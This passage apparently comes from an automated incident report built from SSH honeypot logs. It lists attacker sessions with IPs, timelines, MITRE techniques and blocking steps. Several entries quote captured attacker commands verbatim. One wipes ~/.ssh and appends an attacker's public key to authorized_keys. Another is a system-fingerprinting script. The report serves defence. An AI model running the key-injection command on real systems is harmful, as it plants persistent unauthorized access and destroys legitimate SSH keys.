| `2026-07-24 18:49:39` | `cowrie.client.kex` |
| `2026-07-24 18:49:39` | `cowrie.login.success` |
| `2026-07-24 18:49:40` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:49:40` | `cowrie.direct-tcpip.data` |
| `2026-07-24 18:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301c15d1adf8

| Field | Detail |
|---|---|
| **Source IP** | `201.217.12[.]57` |
| **First Seen** | 2026-07-24 18:50 |
| **Last Seen** | 2026-07-24 18:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:50:04` | `cowrie.session.connect` |
| `2026-07-24 18:50:04` | `cowrie.client.version` |
| `2026-07-24 18:50:04` | `cowrie.client.kex` |
| `2026-07-24 18:50:05` | `cowrie.login.success` |
| `2026-07-24 18:50:05` | `cowrie.session.params` |
| `2026-07-24 18:50:05` | `cowrie.command.input` |
| `2026-07-24 18:50:05` | `cowrie.command.failed` |
| `2026-07-24 18:50:06` | `cowrie.log.closed` |
| `2026-07-24 18:50:07` | `cowrie.session.params` |
| `2026-07-24 18:50:07` | `cowrie.command.input` |
| `2026-07-24 18:50:07` | `cowrie.session.file_download` |
| `2026-07-24 18:50:07` | `cowrie.log.closed` |
| `2026-07-24 18:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.217.12[.]57` to AbuseIPDB if not already reported
- [ ] Block `201.217.12[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca34c36c0b9f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:50 |
| **Last Seen** | 2026-07-24 18:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:50:04` | `cowrie.session.connect` |
| `2026-07-24 18:50:04` | `cowrie.client.version` |
| `2026-07-24 18:50:05` | `cowrie.client.kex` |
| `2026-07-24 18:50:06` | `cowrie.login.success` |
| `2026-07-24 18:50:08` | `cowrie.session.params` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.success` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.command.input` |
| `2026-07-24 18:50:08` | `cowrie.log.closed` |
| `2026-07-24 18:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51b304a3efe5

| Field | Detail |
|---|---|
| **Source IP** | `201.217.12[.]57` |
| **First Seen** | 2026-07-24 18:50 |
| **Last Seen** | 2026-07-24 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:50:08` | `cowrie.session.connect` |
| `2026-07-24 18:50:08` | `cowrie.client.version` |
| `2026-07-24 18:50:08` | `cowrie.client.kex` |
| `2026-07-24 18:50:09` | `cowrie.login.success` |
| `2026-07-24 18:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.217.12[.]57` to AbuseIPDB if not already reported
- [ ] Block `201.217.12[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49248befd5af

| Field | Detail |
|---|---|
| **Source IP** | `201.217.12[.]57` |
| **First Seen** | 2026-07-24 18:50 |
| **Last Seen** | 2026-07-24 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:50:09` | `cowrie.session.connect` |
| `2026-07-24 18:50:09` | `cowrie.client.version` |
| `2026-07-24 18:50:09` | `cowrie.client.kex` |
| `2026-07-24 18:50:10` | `cowrie.login.success` |
| `2026-07-24 18:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.217.12[.]57` to AbuseIPDB if not already reported
- [ ] Block `201.217.12[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2daa01ef985a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:50 |
| **Last Seen** | 2026-07-24 18:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:50:53` | `cowrie.session.connect` |
| `2026-07-24 18:50:53` | `cowrie.client.version` |
| `2026-07-24 18:50:53` | `cowrie.client.kex` |
| `2026-07-24 18:50:54` | `cowrie.login.success` |
| `2026-07-24 18:50:55` | `cowrie.session.params` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.success` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.command.input` |
| `2026-07-24 18:50:55` | `cowrie.log.closed` |
| `2026-07-24 18:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3ae16a9c15e

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:01` | `cowrie.session.connect` |
| `2026-07-24 18:51:01` | `cowrie.client.version` |
| `2026-07-24 18:51:01` | `cowrie.client.kex` |
| `2026-07-24 18:51:03` | `cowrie.login.success` |
| `2026-07-24 18:51:03` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afdc8c6651a

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:09` | `cowrie.session.connect` |
| `2026-07-24 18:51:09` | `cowrie.client.version` |
| `2026-07-24 18:51:09` | `cowrie.client.kex` |
| `2026-07-24 18:51:12` | `cowrie.login.success` |
| `2026-07-24 18:51:12` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ff76bbc7b5e

| Field | Detail |
|---|---|
| **Source IP** | `124.226.216[.]189` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:51 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:33` | `cowrie.session.connect` |
| `2026-07-24 18:51:33` | `cowrie.client.version` |
| `2026-07-24 18:51:33` | `cowrie.client.kex` |
| `2026-07-24 18:51:34` | `cowrie.login.success` |
| `2026-07-24 18:51:36` | `cowrie.session.params` |
| `2026-07-24 18:51:36` | `cowrie.command.input` |
| `2026-07-24 18:51:36` | `cowrie.command.failed` |
| `2026-07-24 18:51:36` | `cowrie.log.closed` |
| `2026-07-24 18:51:37` | `cowrie.session.params` |
| `2026-07-24 18:51:37` | `cowrie.command.input` |
| `2026-07-24 18:51:50` | `cowrie.session.file_download` |
| `2026-07-24 18:51:50` | `cowrie.log.closed` |
| `2026-07-24 18:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.226.216[.]189` to AbuseIPDB if not already reported
- [ ] Block `124.226.216[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f63f4bb3bb

| Field | Detail |
|---|---|
| **Source IP** | `124.226.216[.]189` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:51` | `cowrie.session.connect` |
| `2026-07-24 18:51:51` | `cowrie.client.version` |
| `2026-07-24 18:51:51` | `cowrie.client.kex` |
| `2026-07-24 18:51:52` | `cowrie.login.success` |
| `2026-07-24 18:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.226.216[.]189` to AbuseIPDB if not already reported
- [ ] Block `124.226.216[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ef3285e089

| Field | Detail |
|---|---|
| **Source IP** | `124.226.216[.]189` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:52` | `cowrie.session.connect` |
| `2026-07-24 18:51:52` | `cowrie.client.version` |
| `2026-07-24 18:51:52` | `cowrie.client.kex` |
| `2026-07-24 18:51:53` | `cowrie.login.success` |
| `2026-07-24 18:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.226.216[.]189` to AbuseIPDB if not already reported
- [ ] Block `124.226.216[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6346e17ae1db

| Field | Detail |
|---|---|
| **Source IP** | `147.50.103[.]212` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:56` | `cowrie.session.connect` |
| `2026-07-24 18:51:56` | `cowrie.client.version` |
| `2026-07-24 18:51:56` | `cowrie.client.kex` |
| `2026-07-24 18:51:57` | `cowrie.login.success` |
| `2026-07-24 18:51:58` | `cowrie.session.params` |
| `2026-07-24 18:51:58` | `cowrie.command.input` |
| `2026-07-24 18:51:58` | `cowrie.command.failed` |
| `2026-07-24 18:51:59` | `cowrie.log.closed` |
| `2026-07-24 18:52:00` | `cowrie.session.params` |
| `2026-07-24 18:52:00` | `cowrie.command.input` |
| `2026-07-24 18:52:00` | `cowrie.session.file_download` |
| `2026-07-24 18:52:00` | `cowrie.log.closed` |
| `2026-07-24 18:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.103[.]212` to AbuseIPDB if not already reported
- [ ] Block `147.50.103[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4081b9c800e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:51 |
| **Last Seen** | 2026-07-24 18:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:51:57` | `cowrie.session.connect` |
| `2026-07-24 18:51:57` | `cowrie.client.version` |
| `2026-07-24 18:51:57` | `cowrie.client.kex` |
| `2026-07-24 18:51:58` | `cowrie.login.success` |
| `2026-07-24 18:51:59` | `cowrie.session.params` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.success` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:51:59` | `cowrie.command.input` |
| `2026-07-24 18:52:00` | `cowrie.log.closed` |
| `2026-07-24 18:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-141120f5d60e

| Field | Detail |
|---|---|
| **Source IP** | `147.50.103[.]212` |
| **First Seen** | 2026-07-24 18:52 |
| **Last Seen** | 2026-07-24 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:52:01` | `cowrie.session.connect` |
| `2026-07-24 18:52:01` | `cowrie.client.version` |
| `2026-07-24 18:52:01` | `cowrie.client.kex` |
| `2026-07-24 18:52:02` | `cowrie.login.success` |
| `2026-07-24 18:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.103[.]212` to AbuseIPDB if not already reported
- [ ] Block `147.50.103[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93acf5d15a5

| Field | Detail |
|---|---|
| **Source IP** | `147.50.103[.]212` |
| **First Seen** | 2026-07-24 18:52 |
| **Last Seen** | 2026-07-24 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:52:02` | `cowrie.session.connect` |
| `2026-07-24 18:52:02` | `cowrie.client.version` |
| `2026-07-24 18:52:03` | `cowrie.client.kex` |
| `2026-07-24 18:52:04` | `cowrie.login.success` |
| `2026-07-24 18:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.103[.]212` to AbuseIPDB if not already reported
- [ ] Block `147.50.103[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca62072d0016

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:52 |
| **Last Seen** | 2026-07-24 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:52:18` | `cowrie.session.connect` |
| `2026-07-24 18:52:18` | `cowrie.client.version` |
| `2026-07-24 18:52:18` | `cowrie.client.kex` |
| `2026-07-24 18:52:19` | `cowrie.login.success` |
| `2026-07-24 18:52:20` | `cowrie.session.params` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.success` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.command.input` |
| `2026-07-24 18:52:20` | `cowrie.log.closed` |
| `2026-07-24 18:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2fefc97798

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:53 |
| **Last Seen** | 2026-07-24 18:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:53:36` | `cowrie.session.connect` |
| `2026-07-24 18:53:36` | `cowrie.client.version` |
| `2026-07-24 18:53:36` | `cowrie.client.kex` |
| `2026-07-24 18:53:38` | `cowrie.login.success` |
| `2026-07-24 18:53:39` | `cowrie.session.params` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.success` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:39` | `cowrie.command.input` |
| `2026-07-24 18:53:40` | `cowrie.log.closed` |
| `2026-07-24 18:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9fb791eda56

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:53 |
| **Last Seen** | 2026-07-24 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:53:41` | `cowrie.session.connect` |
| `2026-07-24 18:53:41` | `cowrie.client.version` |
| `2026-07-24 18:53:41` | `cowrie.client.kex` |
